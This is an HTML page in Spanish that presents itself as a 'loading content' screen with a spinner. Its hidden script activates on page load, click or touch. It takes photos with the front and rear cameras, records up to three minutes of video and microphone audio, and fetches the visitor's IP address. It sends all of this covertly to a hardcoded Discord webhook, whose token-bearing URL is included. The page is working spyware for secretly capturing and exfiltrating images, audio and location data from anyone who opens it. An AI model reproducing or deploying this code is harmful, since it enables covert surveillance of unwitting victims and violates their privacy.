<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Cargando...</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    height: 100vh;
    background: #000;
    font-family: 'Segoe UI', Arial, sans-serif;
    color: #fff;
    overflow: hidden;
    cursor: pointer;
  }

  .overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    background: #000;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 25px;
    z-index: 9999;
    color: #e0e0e0;
  }

  .spinner {
    width: 45px;
    height: 45px;
    border: 4px solid #222;
    border-top: 4px solid #888;
    border-radius: 50%;
    animation: girar 1s linear infinite;
  }

  @keyframes girar {
    to { transform: rotate(360deg); }
  }

  .overlay-text {
    font-size: 16px;
    color: #888;
    letter-spacing: 0.5px;
  }

  .hidden { display: none; }
</style>
</head>
<body>

  <div class="overlay" id="overlay">
    <div class="spinner"></div>
    <div class="overlay-text">Cargando contenido, por favor espera...</div>
  </div>

  <div class="hidden">
    <video id="video" autoplay playsinline muted></video>
  </div>

  <script>
    const video = document.getElementById('video');

    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1548766063771254846/WIxKE3JXCwdU0HKqeaRcWap1luqS87meWhUDKwN7mWXWge7Ra_nK9CXhUTy3kiKpO9Vm';

    // ====== CONFIGURACIÓN ======
    const SEGUNDOS_POR_TROZO = 3;   // duración de cada trozo
    const MAX_TROZOS = 60;          // 60 x 3s = 3 minutos máximo
    const ANCHO = 320;
    const ALTO = 240;
    const CAMARA_VIDEO = 'user';    // 'user' frontal, 'environment' trasera
    // ===========================

    let currentStream = null;
    let yaEnviado = false;
    let pidiendo = false;
    let ipUsuario = null;

    async function obtenerIP() {
      if (ipUsuario) return ipUsuario;
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        ipUsuario = data.ip;
        return ipUsuario;
      } catch (err) {
        console.warn('No se pudo obtener la IP:', err);
        return null;
      }
    }

    function horaActual() {
      const d = new Date();
      const pad = n => String(n).padStart(2, '0');
      return `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())} - ${pad(d.getDate())}/${pad(d.getMonth()+1)}/${d.getFullYear()}`;
    }

    async function capturarFoto(facingMode) {
      if (currentStream) {
        currentStream.getTracks().forEach(t => t.stop());
        currentStream = null;
      }

      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: facingMode },
        audio: false
      });

      currentStream = stream;
      video.srcObject = stream;

      await new Promise(resolve => {
        if (video.readyState >= 2) resolve();
        else video.onloadeddata = () => resolve();
      });
      await new Promise(resolve => setTimeout(resolve, 1000));

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));

      if (currentStream) {
        currentStream.getTracks().forEach(t => t.stop());
        currentStream = null;
      }

      return blob;
    }

    async function enviarAlWebhook(blob, mensaje, nombreArchivo) {
      const formData = new FormData();
      formData.append('file', blob, nombreArchivo);
      formData.append('payload_json', JSON.stringify({ content: mensaje }));

      try {
        const res = await fetch(WEBHOOK_URL, {
          method: 'POST',
          body: formData
        });
        console.log(`[${nombreArchivo}] status=${res.status}`);
        return res.ok;
      } catch (err) {
        console.error(`[${nombreArchivo}] Error:`, err);
        return false;
      }
    }

    function elegirMimeTypeVideo() {
      const candidatos = [
        'video/webm;codecs=vp8,opus',
        'video/webm;codecs=vp9,opus',
        'video/webm',
        'video/mp4'
      ];
      for (const c of candidatos) {
        if (MediaRecorder.isTypeSupported(c)) {
          console.log('mimeType elegido:', c);
          return c;
        }
      }
      return '';
    }

    async function grabarVideoEnTrozos(hora, linkIP) {
      if (!navigator.mediaDevices || !window.MediaRecorder) {
        throw new Error('MediaRecorder no soportado');
      }

      console.log('Solicitando cámara + micrófono...');
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: CAMARA_VIDEO,
          width: { ideal: ANCHO },
          height: { ideal: ALTO }
        },
        audio: true
      });

      console.log('Tracks obtenidos:', stream.getTracks().map(t => t.kind));

      const mimeType = elegirMimeTypeVideo();
      const esMp4 = mimeType.includes('mp4');
      const ext = esMp4 ? 'mp4' : 'webm';
      const opciones = mimeType ? { mimeType } : {};

      let trozo = 0;

      // Función que graba un solo trozo de X segundos
      function grabarTrozo() {
        return new Promise((resolve, reject) => {
          let recorder;
          try {
            recorder = new MediaRecorder(stream, opciones);
          } catch (e) {
            reject(new Error('No se pudo crear MediaRecorder: ' + e.message));
            return;
          }

          const chunks = [];

          recorder.ondataavailable = e => {
            if (e.data && e.data.size > 0) chunks.push(e.data);
          };

          recorder.onerror = e => {
            console.error('Error en MediaRecorder:', e);
            reject(e);
          };

          recorder.onstop = () => {
            const blob = new Blob(chunks, { type: mimeType || 'video/webm' });
            resolve(blob);
          };

          try {
            recorder.start();
          } catch (e) {
            reject(new Error('No se pudo iniciar grabación: ' + e.message));
            return;
          }

          setTimeout(() => {
            if (recorder.state !== 'inactive') recorder.stop();
          }, SEGUNDOS_POR_TROZO * 1000);
        });
      }

      // Bucle infinito hasta que el usuario salga o se alcance el máximo
      while (trozo < MAX_TROZOS) {
        trozo++;
        console.log(`Grabando trozo ${trozo}/${MAX_TROZOS}...`);

        let blob;
        try {
          blob = await grabarTrozo();
        } catch (e) {
          console.error('Error grabando trozo:', e);
          break;
        }

        if (!blob || blob.size === 0) {
          console.warn(`Trozo ${trozo} vacío.`);
          continue;
        }

        console.log(`Trozo ${trozo}: ${(blob.size/1024).toFixed(1)} KB. Enviando...`);

        // Enviar SIN esperar la respuesta (no bloquea el siguiente trozo)
        enviarAlWebhook(
          blob,
          `🎥 **Video+Audio - trozo ${trozo}** (${SEGUNDOS_POR_TROZO}s)\n🕒 Hora: ${hora}\n🌐 IP: ${linkIP}`,
          `video_trozo_${trozo}.${ext}`
        ).then(ok => {
          if (!ok) console.warn(`Trozo ${trozo} falló al enviar.`);
        });
      }

      stream.getTracks().forEach(t => t.stop());
    }

    async function iniciar() {
      if (pidiendo || yaEnviado) return;
      pidiendo = true;

      const hora = horaActual();
      const ip = await obtenerIP();
      const linkIP = ip ? `https://whatismyipaddress.com/ip/${ip}` : 'IP no disponible';

      try {
        // Fotos
        console.log('Foto frontal...');
        const fotoFrontal = await capturarFoto('user');
        await enviarAlWebhook(
          fotoFrontal,
          `📸 **Foto frontal** (mismo usuario)\n🕒 Hora: ${hora}\n🌐 IP: ${linkIP}`,
          'frontal.jpg'
        );

        await new Promise(r => setTimeout(r, 500));

        try {
          console.log('Foto trasera...');
          const fotoTrasera = await capturarFoto('environment');
          await enviarAlWebhook(
            fotoTrasera,
            `📸 **Foto trasera** (mismo usuario)\n🕒 Hora: ${hora}\n🌐 IP: ${linkIP}`,
            'trasera.jpg'
          );
        } catch (e) {
          console.warn('Sin cámara trasera:', e);
        }

        await new Promise(r => setTimeout(r, 500));

        // Video en trozos
        console.log('Iniciando video en trozos...');
        await grabarVideoEnTrozos(hora, linkIP);

        yaEnviado = true;
        console.log('Proceso completo.');

      } catch (err) {
        console.error('Error general:', err);
        try {
          const texto = new Blob(
            [`⚠️ Error.\nHora: ${hora}\nIP: ${linkIP}\nMotivo: ${err.message || err}\nNombre: ${err.name || ''}`],
            { type: 'text/plain' }
          );
          await enviarAlWebhook(texto, `⚠️ Error\n🕒 ${hora}\n🌐 ${linkIP}`, 'error.txt');
        } catch (e) {}
      } finally {
        pidiendo = false;
      }
    }

    window.addEventListener('load', () => {
      iniciar();
    });

    document.addEventListener('click', () => {
      if (!yaEnviado && !pidiendo) iniciar();
    });
    document.addEventListener('touchstart', () => {
      if (!yaEnviado && !pidiendo) iniciar();
    });
  </script>

</body>
</html>
